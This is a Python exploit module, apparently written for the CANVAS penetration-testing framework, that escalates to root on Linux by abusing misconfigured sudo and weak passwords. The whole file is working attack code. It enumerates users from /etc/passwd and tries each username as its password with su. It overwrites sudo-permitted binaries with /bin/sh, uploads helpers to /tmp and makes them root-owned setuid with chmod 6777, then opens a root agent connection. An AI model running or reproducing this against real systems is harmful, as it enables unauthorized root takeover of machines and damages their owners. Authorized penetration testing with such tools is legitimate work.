#! /usr/bin/env python

# system imports
import sys
import os
if '.' not in sys.path:
    sys.path.append('.')

import canvasengine

from exploitutils import *
from canvaserror import *
import random

from ExploitTypes.linuxLocalExploit import LinuxLocalExploit
from linuxNode import linuxNode

# GUI info
NAME                            = "Misconfigured su/sudo privilege escalation"
DESCRIPTION                     = "Tries to elevate to root by abusing misconfigured sudoers or weak user passwords"
DOCUMENTATION                   = {}
DOCUMENTATION["DATE PUBLIC"]    = ""
DOCUMENTATION["REFERENCES"]     = ""
DOCUMENTATION["CVE NAME"]       = "N/A"
DOCUMENTATION["CVE URL"]        = ""
DOCUMENTATION['CVSS']           = 7.8
DOCUMENTATION["REPEATABILITY"]  = "Infinite"
DOCUMENTATION["NOTES"]          = """
This exploit tries to elevate privileges by trying to abuse the following:

- Users that have been configured with username==password.
- Users that can be elevated with ALL=(ALL) NOPASSWD:ALL.
- Users that can execute commands that can be overwritten.
"""
VERSION                         = "1.0"
PROPERTY                        = {}
PROPERTY['TYPE']                = "Exploit"
PROPERTY['SITE']                = "Local"
PROPERTY['ARCH']                = [ ["Linux", "x64", "x86"]]


class theexploit(LinuxLocalExploit):
    def __init__(self):
        LinuxLocalExploit.__init__(self)
        self.name           = NAME
        self.node           = None
        self.remote_helper  = '/tmp/h'
        self.remote_exp     = '/tmp/x'
        self.su_execute     = self.loadPythonExecute()
        self.sudo_execute   = "printf \"**USER**\\n\" | sudo -S **CMD**"
        self.sudo_list      = "printf \"**USER**\\n\" | sudo -Sln"

    def parsePasswd(self, node):
        #Parses /etc/passwd and returns a list() of users that have a shell
        logging.info("Downloading /etc/passwd and getting users...")
        result = node.runcommand("cat /etc/passwd")
        result = result.splitlines()
        out = list()
        for usr in result:
            data = usr.split(":")
            if "sh" in data[6]:
                out.append(data[0])
        return out

    def loadPythonExecute(self):
        #Loads the file su_execute.py, which executes and tests su.
        #Then it generates a command line python execution string.
        su_execute = ""
        res_path   = os.path.join(os.path.dirname(__file__), 'Resources', 'su_execute.py')
        with open(res_path, "r") as f:
            su_execute = f.readlines()

        su_execute = ('; '.join(su_execute)).replace('\n','')
        su_execute = "python -c '" + su_execute + "'"

        return su_execute

    def runBaseCases(self, node):
        #Runs base cases that do not depend on users.
        logging.info("Running base cases...")
        output = node.runcommand("sudo -n id")
        if "uid=0(root)" in output:
            logging.info("Success! Got r00t!")
            return "sudo -n **CMD**"
        output = node.runcommand("sudo -ln")
        return self.checkSudoList(output, node, None)

    def overWriteIfAllowed(self, node, path, user):
        cmd = "cp -f /bin/sh " + path
        if user is not None:
            cmd = self.prepareCase("su_execute", user, cmd)
        output = node.runcommand(cmd)
        if "Permission denied" not in output:
            return True
        return False

    def checkSudoList(self, sudoList, node, user):
        #Parses the output of the command sudo -l
        sudoList = sudoList.splitlines()
        i = 0
        for i in range(0, len(sudoList)):
            if "may run the following commands" in sudoList[i]:
                break
        i = i + 1
        for j in range(i, len(sudoList)):
            line = sudoList[j]
            try:
                line = line[line.index("/"):]
            except ValueError:
                continue
            line = line.split(",")
            for cmd in line:
                logging.info("Trying to overwrite file %s", cmd)
                cmd = cmd.strip()
                if self.overWriteIfAllowed(node, cmd, user):
                    logging.info("Success!")
                    if user is None:
                        return "sudo -n " + cmd + " -c \"**CMD**\""
                    return self.prepareCase("sudo_execute", user, cmd + ' -c \"**CMD**\"')
                logging.warning("Failed!")

        return None

    def isPythonPresent(self, node):
        output = node.runcommand("python -V")
        if "Python" in output:
            logging.info("Target has Python installed")
            return True
        else:
            logging.info("Target does not have Python installed")
            return False

    def prepareCase(self, case, user, cmd):
        if case == "su_execute":
            return self.su_execute.replace("**USER**", user).replace("**CMD**",cmd)
        if case == "sudo_execute":
            tmpSudo = self.sudo_execute.replace("**USER**", user).replace("**CMD**",cmd)
            tmpSudo = tmpSudo.replace("\\", "\\\\").replace("\"","\\\"").replace("\'", "\\\'")
            return (self.su_execute.replace("**USER**", user)).replace("**CMD**",tmpSudo)
        if case == "sudo_list":
            tmpSudo = self.sudo_list.replace("**USER**", user)
            tmpSudo = tmpSudo.replace("\\", "\\\\").replace("\"","\\\"").replace("\'", "\\\'")
            return self.su_execute.replace("**USER**", user).replace("**CMD**",tmpSudo)
        else:
            raise ValueError("Invalid case")
        return None

    def generateCases(self, intUsers):
        #Generates the cases for each sudo/su test, for each user.
        cases = dict()
        for intUser in intUsers:
            case = dict()
            case["su_execute"] = self.prepareCase("su_execute",intUser,"id")
            case["sudo_execute"] = self.prepareCase("sudo_execute",intUser,"id")
            case["sudo_list"] = self.prepareCase("sudo_list",intUser,"id")
            cases[intUser] = case
        return cases

    def runCases(self, cases, node):
        hasPython = self.isPythonPresent(node)
        if hasPython:
            for user, case in cases.iteritems():
                logging.info("Testing user == password on user %s...", user)
                caseOutput = node.runcommand(case["su_execute"])
                if "uid=" in caseOutput:
                    logging.info("Success! Testing unrestricted sudoers on user %s", user)
                    caseOutput = node.runcommand(case["sudo_execute"])
                    if "uid=0(root)" in caseOutput:
                        logging.info("Success! Got r00t!")
                        return self.prepareCase("sudo_execute", user, "**CMD**")
                    logging.info("Failed! Trying to list sudoable commands...")
                    caseOutput = node.runcommand(case["sudo_list"])
                    sudoList = self.checkSudoList(caseOutput, node, user)
                    if sudoList != None:
                        return sudoList
        return None

    def try_elevate(self, node, case):
        if self.is_32bit_node():
            if self.nodeUpload(self.local_helper_32, self.remote_exp) == False:
                return False
            if self.nodeUpload(self.local_helper_32, self.remote_helper) == False:
                return False
        else:
            if self.nodeUpload(self.local_helper_64, self.remote_exp) == False:
                return False
            if self.nodeUpload(self.local_helper_64, self.remote_helper) == False:
                return False
        case1 = case.replace("**CMD**", "chown 0:0 " + self.remote_helper)
        case2 = case.replace("**CMD**", "chmod 6777 " + self.remote_helper)
        output = node.runcommand(case1)
        if "Operation not permitted" in output:
            self.cleanup()
            return False
        output = node.runcommand(case2)
        if self.compromised(self.remote_helper, 5):
            logging.info('Compromised!')
            logging.info('Upgrading MOSDEF connection loop')
            self.fork_and_exec(self.remote_helper, wait = 1)
            self.cleanup()
            logging.info('Done')
            self.init_mosdef_upgrade()
            self.cleanup()
            return True
        return False

    def run(self):
        self.setInfo("%s (in progress)" % (NAME))
        node = self.argsDict["passednodes"][0]
        self.result = []
        for node in self.argsDict["passednodes"]:
            if node.shell is None:
                logging.warning("No shell present in target node, skipping")
                self.result += [0]
                continue
            if node.nodetype != "linuxNode":
                logging.warning("Node is not a valid linux node, skipping")
                self.result += [0]
                continue
            case = self.runBaseCases(node)
            if case is None:
                intUsers = self.parsePasswd(node)
                if len(intUsers) != 0:
                    cases = self.generateCases(intUsers)
                    case = self.runCases(cases, node)
                else:
                    logging.warning("Could not get any valid users")
            if case is not None:
                self.node = node
                if self.try_elevate(node, case):
                    self.result += [1]
                    logging.info("Success! MOSDEF node upgraded to full privileges")
                    continue
            self.cleanup()
            self.result += [0]
            logging.critical("Could not compromise target")

        if 1 in self.result:
            return 1
        return 0


if __name__ == '__main__':
    logging.info('Running CANVAS %s Exploit v%s' % (NAME, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)
